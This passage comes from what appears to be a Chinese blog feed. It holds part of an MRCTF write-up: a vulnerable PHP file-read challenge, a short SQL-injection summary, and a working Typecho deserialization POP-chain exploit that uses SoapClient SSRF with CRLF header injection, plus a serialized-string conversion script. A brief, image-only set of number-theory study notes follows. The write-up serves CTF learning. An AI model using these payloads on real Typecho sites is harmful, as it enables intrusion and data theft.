plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#39;takeip.php&#39;;</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;.&#39;); </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;Merak&#39;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v &#x3D; base64_decode($v); </span><br><span class="line">    $re &#x3D; &#39;&#39;; </span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>file_get_contents()</code>用<code>data://</code>或者<code>php://input</code>伪协议绕过,根据加密脚本可以编写出dechange函数，得到<code>ZmpdYSZmXGI=</code>，最终发包得到flag</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200401230121454.png" alt></p><h4 id="0x-06-Ezaudit"><a href="#0x-06-Ezaudit" class="headerlink" title="0x 06 Ezaudit"></a>0x 06 Ezaudit</h4><p><a href="http://www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag" target="_blank" rel="noopener">www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag</a></p><h4 id="0x-07-Ezpop-Revenge"><a href="#0x-07-Ezpop-Revenge" class="headerlink" title="0x 07 Ezpop_Revenge"></a>0x 07 Ezpop_Revenge</h4><p>var/Typecho/Plugin.php</p><p>激活插件方法处得到绑定的url</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223613501.png" alt></p><p>首先根据题意全局搜索unserialize,路径为usr/plugins/HelloWorld/Plugin.php中找到反序列化点</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214718378.png" alt></p><p>首先看到这里：</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214946669.png" alt></p><p>找到入口点，跟进Typecho_Db::__construct</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215208957.png" alt></p><p>存在字符串拼接，全局搜索寻找__tostring()魔术方法</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215545678.png" alt></p><p>我们选择var/Typecho/Db/Query.php作为跳板</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215659239.png" alt></p><p>如果$this-&gt;_sqlPreBuild[‘action’]=SELECT就调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild)</span><br></pre></td></tr></table></figure><p>如果令$this-&gt;_adapter为Soapclient实例，触发_call完成ssrf</p><p>pop链构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld_DB::wakeup–&gt;</span><br><span class="line">Typecho_Db::__construct(tostring)–&gt;</span><br><span class="line">Typecho_Db_Query::__construct–&gt;</span><br><span class="line">(this-&gt;_adapter&#x3D;new Soapclient)–&gt;</span><br><span class="line">__call()进行ssrf</span><br></pre></td></tr></table></figure><p>exp构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloWorld_DB&#123;</span><br><span class="line">    private $coincidence;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;coincidence&#x3D;([&#39;hello&#39;&#x3D;&gt;new Typecho_Db_Query()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Db_Query</span><br><span class="line">&#123;</span><br><span class="line">    private $_sqlPreBuild;</span><br><span class="line">    private $_adapter;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_sqlPreBuild[&#39;action&#39;]&#x3D;&#39;SELECT&#39;;</span><br><span class="line">        $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;;</span><br><span class="line">        $headers &#x3D; array(</span><br><span class="line">            &#39;Cookie: PHPSESSID&#x3D;ubcj94u08mcaodg4g1e0nooam2&#39;,</span><br><span class="line">        );</span><br><span class="line">        $this-&gt;_adapter&#x3D;new SoapClient(</span><br><span class="line">            null,</span><br><span class="line">            array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">                &#39;user_agent&#39;&#x3D;&gt;str_replace(&#39;^^&#39;, &quot;\r\n&quot;,&#39;w4nder^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers)),&#39;uri&#39;&#x3D;&gt;&#39;hello&#39;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; serialize(new HelloWorld_DB());</span><br><span class="line">echo base64_encode($a);</span><br></pre></td></tr></table></figure><p>访问/page_admin?admin=1，post提交base64编码的结果得到flag</p><ul><li>后记</li></ul><p>在入口处存在一则过滤，其中过滤了百分号，由于经过base64编码后在解码没有百分号了，所以不需要绕过</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223309609.png" alt></p><p>假设我们需要绕过%分号该如何绕过呢？答案是需要用\00来代替%00</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在 PHP5 最新的 CVS 中，</span><br><span class="line">新的序列化方式叫做 escaped binary string 方式，这是相对与普通那种 non-escaped binary string 方式来说的：</span><br><span class="line">string 型数据（字符串）新的序列化格式为：</span><br><span class="line">S:&quot;&lt;length&gt;&quot;:&quot;&lt;value&gt;&quot;;</span><br><span class="line">其中 &lt;length&gt; 是源字符串的长度，而非 &lt;value&gt; 的长度。&lt;length&gt; 是非负整数，数字前可以带有正号（+）。&lt;value&gt; 为经过转义之后的字符串。</span><br><span class="line">它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 &lt;value&gt; 的内容了。</span><br></pre></td></tr></table></figure><p>普通的序列化小s对应的就是普通的字符串，如s:3:”%00a%00”;<br> 而序列化的大S则对应的是\加上16进制，如S:2:”\00a\00”。</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225703750.png" alt></p><p>将不可见字符%00转化为十六进制，大S成功执行wakeup</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402230042727.png" alt></p><p>小写s则失败</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225923011.png" alt></p><p>转换脚本，参考颖奇师傅的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function decorate($str)</span><br><span class="line">&#123;</span><br><span class="line">    $arr &#x3D; explode(&#39;:&#39;, $str);</span><br><span class="line">    $newstr &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;00&#x2F;&#39;, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i-2] &#x3D; preg_replace(&#39;&#x2F;s&#x2F;&#39;, &quot;S&quot;, $arr[$i-2]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i &#x3D; 0;</span><br><span class="line">    for (; $i &lt; count($arr) - 1; $i++) &#123;</span><br><span class="line">        $newstr .&#x3D; $arr[$i];</span><br><span class="line">        $newstr .&#x3D; &quot;:&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .&#x3D; $arr[$i];</span><br><span class="line">    return $newstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/105189436" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/105189436</a></p><p><a href="https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge</a></p><p><a href="https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/" target="_blank" rel="noopener">https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/</a></p></blockquote><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484708&amp;idx=1&amp;sn=8ebc3f4f1850da54ab7cb1b1879921e0&amp;chksm=9760f1f2a01778e44b586e45172230db1b2b0da09a3b6c357705e930a43260c244e2aa1ecdb6&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1585840887466&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484708&amp;idx=1&amp;sn=8ebc3f4f1850da54ab7cb1b1879921e0&amp;chksm=9760f1f2a01778e44b586e45172230db1b2b0da09a3b6c357705e930a43260c244e2aa1ecdb6&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1585840887466&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h3&gt;&lt;h4 id=&quot;0x-01-Ez-bypass&quot;&gt;&lt;a href=&quot;#0x-01-Ez-bypass&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="MRCTF" scheme="http://yoursite.com/tags/MRCTF/"/>
    
  </entry>
  
  <entry>
    <title>信息安全数学基础学习笔记</title>
    <link href="http://yoursite.com/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-27T15:54:26.000Z</published>
    <updated>2020-04-06T12:44:14.918Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一章-整数的可除性"><a href="#第一章-整数的可除性" class="headerlink" title="第一章 整数的可除性"></a>第一章 整数的可除性</h3><h4 id="0x-01-广义欧几里得除法-求最大公因数"><a href="#0x-01-广义欧几里得除法-求最大公因数" class="headerlink" title="0x  01 广义欧几里得除法 求最大公因数"></a>0x  01 广义欧几里得除法 求最大公因数</h4><ul><li>基础定理</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200331224130106.png" alt></p><ul><li>实现过程</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20180410203051218.png" alt></p><ul><li>python代码实现</li></ul><h4 id="0x-02-贝祖（Bezout）等式"><a href="#0x-02-贝祖（Bezout）等式" class="headerlink" title="0x 02 贝祖（Bezout）等式"></a>0x 02 贝祖（Bezout）等式</h4><ul><li>基本定理</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401114721981.png" alt></p><ul><li>求解等式</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121714567.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121756609.png" alt></p><h4 id="0x-03-最大公因数进一步性质"><a href="#0x-03-最大公因数进一步性质" class="headerlink" title="0x 03 最大公因数进一步性质"></a>0x 03 最大公因数进一步性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401221905664.png" alt></p><h4 id="0x-04-整数的进一步性质"><a href="#0x-04-整数的进一步性质" class="headerlink" title="0x 04 整数的进一步性质"></a>0x 04 整数的进一步性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222233184.png" alt></p><h4 id="0x-05-算术基本定理与素数定理"><a href="#0x-05-算术基本定理与素数定理" class="headerlink" title="0x 05 算术基本定理与素数定理"></a>0x 05 算术基本定理与素数定理</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401193511202.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401222410868.png" alt></p><h3 id="第二章-同余"><a href="#第二章-同余" class="headerlink" title="第二章 同余"></a>第二章 同余</h3><h4 id="0x-01-同余的基本概念和性质"><a href="#0x-01-同余的基本概念和性质" class="headerlink" title="0x 01 同余的基本概念和性质"></a>0x 01 同余的基本概念和性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403222304291.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403224812594.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403224939302.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225013389.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225117248.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200403225331985.png" alt></p><h4 id="0x-02-剩余类与完全剩余"><a href="#0x-02-剩余类与完全剩余" class="headerlink" title="0x 02 剩余类与完全剩余"></a>0x 02 剩余类与完全剩余</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404225247817.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404225914840.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404230300776.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404232810037.png" alt></p><h4 id="0x-03-简化剩余系与欧拉函数"><a href="#0x-03-简化剩余系与欧拉函数" class="headerlink" title="0x 03 简化剩余系与欧拉函数"></a>0x 03 简化剩余系与欧拉函数</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200404233701768.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406100107582.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204153855.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204246058.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200406204313339.png" alt></p><h4 id="0x-04-欧拉定理"><a href="#0x-04-欧拉定理" class="headerlink" title="0x 04 欧拉定理"></a>0x 04 欧拉定理</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;第一章-整数的可除性&quot;&gt;&lt;a href=&quot;#第一章-整数的可除性&quot; class=&quot;headerlink&quot; title=&quot;第一章 整数的可除性&quot;&gt;&lt;/a&gt;第一章 整数的可除性&lt;/h3&gt;&lt;h4 id=&quot;0x-01-广义欧几里得除法-求最大公因数&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="knowledge" scheme="http://yoursite.com/categories/knowledge/"/>
    
    
      <category term="信安数基" scheme="http://yoursite.com/tags/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA/"/>
    
  </entry>
  
</feed>
